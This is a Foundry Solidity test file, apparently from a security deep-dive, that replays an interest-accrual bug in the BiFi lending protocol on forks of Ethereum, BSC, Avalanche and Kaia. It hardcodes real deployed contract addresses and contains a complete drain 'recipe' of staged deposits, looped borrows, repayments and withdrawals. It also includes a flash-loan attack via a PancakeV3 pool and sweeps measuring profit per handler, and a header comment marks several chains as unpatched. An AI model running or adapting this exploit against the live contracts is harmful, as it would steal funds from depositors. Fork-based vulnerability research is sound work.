// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {AttackTok} from "../src/AttackTok.sol";

interface IERC20V {
    function approve(address, uint256) external;
    function balanceOf(address) external view returns (uint256);
    function decimals() external view returns (uint8);
}

interface IH {
    function deposit(uint256, bool) external payable;
    function borrow(uint256, bool) external;
    function withdraw(uint256, bool) external;
    function repay(uint256, bool) external payable;
}

interface ITM {
    function setCircuitBreaker(bool) external returns (bool);
    function getCircuitBreaker() external view returns (bool);
}

interface IIM {
    function blocksPerYear() external view returns (uint256);
}

/// @notice ZH4-PASS3 BiFi deep-dive: fork replay of the idle-market interest-accrual bug.
/// READ-ONLY on mainnet; every state change below happens on a local fork only.
/// Key correction vs pass-3 README: the ETH interest models were patched to
/// blocksPerYear = type(uint256).max on 2026-10-17 (blocks 26,211,987-90) -> per-block
/// interest is exactly 0, so ETH is NOT extractable even if unpaused. BSC/AVAX/Kaia are
/// unpatched (blocksPerYear = 10,512,000 / 31,536,000).
contract BiFiFullTest is Test {
    uint256 constant MAXU = type(uint256).max;
    uint256 constant LIMIT2M = 2_000_000e18;

    // ---- Ethereum ----
    address constant ETH_TM = 0x913F2DEe2746CdA2ab34106c47aBC4a8f4e36fa5;
    address constant ETH_BREAKER = 0x81C22BEC01C83E5BFf125d3a52634dBEf60d93d4;
    address constant ETH_USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant ETH_USDT_H = 0x808C3bA97268dbF9695b1EC10729E09c7e67A9E3;
    address[5] ETH_MODELS = [
        0xCbf361d934e2ac49B2C47c2910ea9489ab955829,
        0x29Ecabde2C57B6D4183f915eBca1A25804A60dB1,
        0x105ea44ffa77f517E31F20D7c22EBeBf739bBf87,
        0x7560ad17e2A0b790019734BF4f9790323CD68Cb6,
        0x24231014199e0C1A8EC2D963389008D85b658f7d
    ];

    // ---- BSC ----
    address constant BSC_TM = 0x8010F9E14C8286B9312e624370fdDC07fee2Fc75;
    address constant BSC_OWNER = 0xf357a08C8D4A385Cebddb517a44b210A0F6b3393;
    address constant BSC_POOL = 0x92b7807bF19b7DDdf89b706143896d05228f3121; // PancakeV3 USDT/USDC 0.01%
    address constant BSC_USDT = 0x55d398326f99059fF775485246999027B3197955;
    address constant BSC_USDC = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;
    address constant BSC_DAI = 0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3;
    address constant BSC_BTCB = 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c;
    address constant BSC_ETH = 0x2170Ed0880ac9A755fd29B2688956BD959F933F8;
    address constant BSC_USDT_H = 0x2A29598cbc17BA112C8Fd0E07Fbf5402eF57E6b8;
    address constant BSC_USDC_H = 0xBA9De5a8FD91408826616f2d6d7470A11E34c9F0;
    address constant BSC_DAI_H = 0xB67C5433d234d656002f12664d15ab4b40666D9B;
    address constant BSC_BTCB_H = 0x26d0E4707af1c1DAAd8e9BA21b99cDa7Fd24c40B;
    address constant BSC_ETH_H = 0xf86d8218BCC15874f5D25c191FdDd43F2334c3EB;

    // ---- Avalanche ----
    address constant AVAX_TM = 0x74326D2bFBF22312158850AC3B4F7AE8A0a347fD;
    address constant AVAX_BREAKER = 0x2184AD186Ff046E1038d9eBbEFAB82e297F37E95;
    address constant AVAX_USDC = 0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664;
    address constant AVAX_USDC_H = 0x8385Ea36dD4BDC84B3F2ac718C332E18C1E42d36;

    // ---- Kaia (Orbit-Bridge-wrapped tokens; see README) ----
    address constant KAIA_TM = 0x2014e42d5d63b18728b30C1E3360e0B2C0e839cd;
    address constant KAIA_BREAKER = 0x2184AD186Ff046E1038d9eBbEFAB82e297F37E95;
    address constant KAIA_OUSDT = 0xceE8FAF64bB97a73bb51E115Aa89C17FfA8dD167;
    address constant KAIA_OUSDT_H = 0xe0e67b991d6b5CF73d8A17A10c3DE74616C1ec11;

    /// @dev CI exports per-chain RPC vars even when empty, and vm.envOr returns "" in that case,
    /// so treat an empty value as absent and fall back to a keyless public endpoint.
    function _rpc(string memory key, string memory fallback_) internal view returns (string memory) {
        string memory u = vm.envOr(key, string(""));
        return bytes(u).length == 0 ? fallback_ : u;
    }

    function _eth() internal view returns (string memory) {
        return _rpc("FORK_RPC_URL", _rpc("RPC_URL", "https://ethereum-rpc.publicnode.com"));
    }

    function _bsc() internal view returns (string memory) {
        return _rpc("BSC_RPC_URL", "https://bsc-rpc.publicnode.com");
    }

    function _avax() internal view returns (string memory) {
        return _rpc("AVAX_RPC_URL", "https://avalanche-c-chain-rpc.publicnode.com");
    }

    function _kaia() internal view returns (string memory) {
        return _rpc("KAIA_RPC_URL", "https://public-en.node.kaia.io");
    }

    // ---------------------------------------------------------------- ETH

    function test_eth_models_frozen() public {
        vm.createSelectFork(_eth());
        console2.log("ETH fork block", block.number);
        assertTrue(ITM(ETH_TM).getCircuitBreaker(), "ETH breaker should be ON");
        for (uint256 i = 0; i < 5; i++) {
            uint256 bpy = IIM(ETH_MODELS[i]).blocksPerYear();
            console2.log("ETH model", ETH_MODELS[i], "blocksPerYear", bpy);
            assertEq(bpy, type(uint256).max, "ETH model must be frozen");
        }
    }

    /// @notice Unpausing ETH yields exactly zero interest: deposit + withdraw returns the deposit.
    function test_eth_replay_zero_profit() public {
        vm.createSelectFork(_eth());
        vm.prank(ETH_BREAKER);
        ITM(ETH_TM).setCircuitBreaker(false);
        assertFalse(ITM(ETH_TM).getCircuitBreaker(), "still paused");

        uint256 capital = 1_000_000e6;
        deal(ETH_USDT, address(this), capital);
        IERC20V(ETH_USDT).approve(ETH_USDT_H, MAXU);
        uint256 a = 1_000_000e18;
        IH(ETH_USDT_H).deposit(a, false);
        IH(ETH_USDT_H).withdraw(a, false);
        uint256 endb = IERC20V(ETH_USDT).balanceOf(address(this));
        console2.log("ETH deposit+withdraw in/out", capital, endb);
        assertEq(endb, capital, "ETH interest frozen: exact round-trip expected");
    }

    // ---------------------------------------------------------------- BSC

    function test_bsc_breaker_on() public {
        vm.createSelectFork(_bsc());
        console2.log("BSC fork block", block.number);
        assertTrue(ITM(BSC_TM).getCircuitBreaker(), "BSC breaker should be ON");
    }

    /// @notice Real-capital replay: flash USDT from PancakeV3 (0.01%) and drain the USDT handler.
    function test_bsc_usdt_flash_drain() public {
        vm.createSelectFork(_bsc());
        uint256 h0 = IERC20V(BSC_USDT).balanceOf(BSC_USDT_H);
        console2.log("BSC USDT handler before", h0);
        vm.prank(BSC_OWNER);
        ITM(BSC_TM).setCircuitBreaker(false);
        AttackTok atk = new AttackTok(BSC_USDT, BSC_USDT_H, BSC_POOL);
        atk.run(25_000_000e18); // within the 26.2M USDT in the Pancake pool
        console2.log("net profit (after 0.01% flash fee)", atk.profit());
        console2.log("handler after", IERC20V(BSC_USDT).balanceOf(BSC_USDT_H));
        assertEq(IERC20V(BSC_USDT).balanceOf(BSC_USDT_H), 0, "USDT handler not drained");
        assertGt(atk.profit(), 0, "not profitable");
    }

    /// @notice Deal-capital sweep: how much can be taken from each BSC handler given capital.
    function test_bsc_deal_sweep() public {
        vm.createSelectFork(_bsc());
        vm.prank(BSC_OWNER);
        ITM(BSC_TM).setCircuitBreaker(false);
        _sweep("USDT", BSC_USDT_H, BSC_USDT, 18, LIMIT2M);
        _sweep("USDC", BSC_USDC_H, BSC_USDC, 18, LIMIT2M);
        _sweep("DAI", BSC_DAI_H, BSC_DAI, 18, 1_000_000e18);
        _sweep("BTCB", BSC_BTCB_H, BSC_BTCB, 18, LIMIT2M);
        _sweep("ETHpeg", BSC_ETH_H, BSC_ETH, 18, LIMIT2M);
    }

    /// @notice USDC handler: the largest feasible deposit is bounded by the 2M limitOfAction on
    /// each borrow (borrow = 3.7% of deposit <= 2M  =>  deposit <= ~54.05M), so ~mult 700.
    function test_bsc_usdc_max() public {
        vm.createSelectFork(_bsc());
        vm.prank(BSC_OWNER);
        ITM(BSC_TM).setCircuitBreaker(false);
        _drainDeal("USDC-max", BSC_USDC_H, BSC_USDC, 18, 700, LIMIT2M);
    }

    /// @notice The stored `inactiveActionDelta` is reused for every action in the same block, so the
    /// attacker can repeat the whole recipe inside one block. Test whether that drains the big
    /// USDC handler completely.
    function test_bsc_usdc_loop() public {
        vm.createSelectFork(_bsc());
        vm.prank(BSC_OWNER);
        ITM(BSC_TM).setCircuitBreaker(false);
        _drainLoop("USDC-loop-m500-r4", BSC_USDC_H, BSC_USDC, 18, 500, LIMIT2M, 4);
    }

    /// @notice Realistic flash size: only ~4.19M USDC is flashable from the Pancake V3 pool
    /// (Aave aUSDC 2.16M, Venus vUSDC 6.23M). Can many recycled rounds still drain the handler?
    function test_bsc_usdc_recycle() public {
        vm.createSelectFork(_bsc());
        vm.prank(BSC_OWNER);
        ITM(BSC_TM).setCircuitBreaker(false);
        _drainLoop("USDC-recycle-4.19M-r25", BSC_USDC_H, BSC_USDC, 18, 57, LIMIT2M, 25);
    }

    // ---------------------------------------------------------------- AVAX / Kaia

    function test_avax_replay() public {
        vm.createSelectFork(_avax());
        console2.log("AVAX fork block", block.number);
        assertTrue(ITM(AVAX_TM).getCircuitBreaker(), "AVAX breaker should be ON");
        vm.prank(AVAX_BREAKER);
        ITM(AVAX_TM).setCircuitBreaker(false);
        _drainDeal("AVAX_USDC", AVAX_USDC_H, AVAX_USDC, 6, 1000, LIMIT2M);
    }

    function test_kaia_replay() public {
        vm.createSelectFork(_kaia());
        console2.log("Kaia fork block", block.number);
        assertTrue(ITM(KAIA_TM).getCircuitBreaker(), "Kaia breaker should be ON");
        vm.prank(KAIA_BREAKER);
        ITM(KAIA_TM).setCircuitBreaker(false);
        _drainDeal("KAIA_oUSDT", KAIA_OUSDT_H, KAIA_OUSDT, 6, 1000, LIMIT2M);
    }

    // ---------------------------------------------------------------- helpers

    function _sweep(string memory tag, address handler, address token, uint8 dec, uint256 limit) internal {
        uint256 hb0 = IERC20V(token).balanceOf(handler);
        console2.log("====", tag, "handler balance", hb0);
        uint256[3] memory mults = [uint256(200), 500, 1000];
        for (uint256 i = 0; i < 3; i++) {
            uint256 snap = vm.snapshotState();
            _drainDeal(tag, handler, token, dec, mults[i], limit);
            vm.revertToState(snap);
        }
    }

    function _drainDeal(string memory tag, address handler, address token, uint8 dec, uint256 mult, uint256 limit)
        internal
    {
        uint256 hb = IERC20V(token).balanceOf(handler);
        if (hb == 0) {
            console2.log(tag, "handler empty");
            return;
        }
        uint256 decMul = 10 ** (18 - dec);
        uint256 a = hb * decMul * mult;
        uint256 underlying = a / decMul;
        deal(token, address(this), underlying);
        IERC20V(token).approve(handler, MAXU);

        try this.recipe(handler, a, limit) {} catch {
            console2.log(tag, "  mult", mult, "recipe reverted");
            return;
        }
        uint256 bal = IERC20V(token).balanceOf(handler);
        if (bal > 0) {
            try IH(handler).withdraw(bal * decMul, false) {} catch {}
        }
        uint256 endb = IERC20V(token).balanceOf(address(this));
        console2.log("  mult", mult);
        console2.log("  capital", underlying);
        console2.log("  profit", endb > underlying ? endb - underlying : 0);
        console2.log("  handler after", IERC20V(token).balanceOf(handler));
    }

    function _drainLoop(
        string memory tag,
        address handler,
        address token,
        uint8 dec,
        uint256 mult,
        uint256 limit,
        uint256 rounds
    ) internal {
        uint256 hb = IERC20V(token).balanceOf(handler);
        uint256 decMul = 10 ** (18 - dec);
        uint256 a = hb * decMul * mult;
        uint256 underlying = a / decMul; // flash only ONE round's worth; later rounds recycle withdrawals
        deal(token, address(this), underlying);
        IERC20V(token).approve(handler, MAXU);
        console2.log("====", tag);
        console2.log("  handler", hb);
        console2.log("  capital", underlying);
        for (uint256 r = 0; r < rounds; r++) {
            try this.recipe(handler, a, limit) {} catch {
                console2.log("  round", r, "recipe reverted");
                break;
            }
            console2.log("  after round", r);
            console2.log("  attacker bal", IERC20V(token).balanceOf(address(this)));
            console2.log("  handler bal", IERC20V(token).balanceOf(handler));
        }
        uint256 bal = IERC20V(token).balanceOf(handler);
        if (bal > 0) {
            try IH(handler).withdraw(bal * decMul, false) {} catch {}
        }
        uint256 endb = IERC20V(token).balanceOf(address(this));
        console2.log("  total profit", endb > underlying ? endb - underlying : 0);
        console2.log("  handler final", IERC20V(token).balanceOf(handler));
    }

    function recipe(address handler, uint256 a, uint256 limit) external {
        require(msg.sender == address(this), "self");
        uint256 d1 = a * 2995 / 1_000_000;
        uint256 d2 = a * 11964 / 1_000_000;
        uint256 d3 = a * 44327 / 1_000_000;
        uint256 d4 = a * 178736 / 1_000_000;
        IH(handler).deposit(d1, false);
        IH(handler).deposit(d2, false);
        IH(handler).deposit(d3, false);
        IH(handler).deposit(d4, false);
        IH(handler).deposit(a - d1 - d2 - d3 - d4, false);
        IH(handler).deposit(0, false);
        for (uint256 i = 0; i < 20; i++) IH(handler).borrow(a * 37 / 1000, false);
        uint256 w = a * 5 / 100;
        if (w > limit) w = limit;
        for (uint256 i = 0; i < 20; i++) {
            IH(handler).repay(a * 37 / 1000, false);
            IH(handler).withdraw(w, false);
        }
        IH(handler).repay(MAXU, false);
    }
}
